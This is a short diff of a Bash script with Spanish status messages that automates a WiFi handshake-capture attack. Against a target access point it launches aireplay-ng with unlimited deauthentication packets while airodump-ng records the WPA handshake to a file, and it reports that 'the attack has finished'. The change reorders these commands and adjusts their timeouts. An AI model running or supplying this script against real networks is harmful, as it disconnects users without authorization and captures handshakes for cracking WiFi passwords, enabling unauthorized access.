@@ -383,9 +383,9 @@ sleep 1
 timeout --foreground 2s airodump-ng --bssid $bssid -c $ch $interface$mon
 echo -e "$nc($blue*$nc)$green ejecutando xterm en 5 segundos.."
 sleep 5
-timeout --foreground 40s xterm -hold -e "airodump-ng -w handshake/$doc.cap --bssid $bssid -c $ch $interface$mon" & 
-timeout --foreground 25s xterm -hold -e "aireplay-ng --deauth 0 -a $bssid $interface$mon"
-echo -e "$nc($blue*$nc)$green El handshake fue capturado exitosamente PATH:$blue handshake/$doc.pcap"
+timeout --foreground 30s xterm -hold -e "aireplay-ng --deauth 0 -a $bssid $interface$mon" & 
+timeout --foreground 60s xterm -hold -e "airodump-ng -w handshake/$doc.cap --bssid $bssid -c $ch $interface$mon" 
+echo -e "$nc($blue*$nc)$green El handshake fue capturado exitosamente PATH:$blue handshake/$doc.cap"
 sleep 4
 echo -e "$nc($blue*$nc)$green el ataque ha Finalizado..$yellow"
 sleep 2
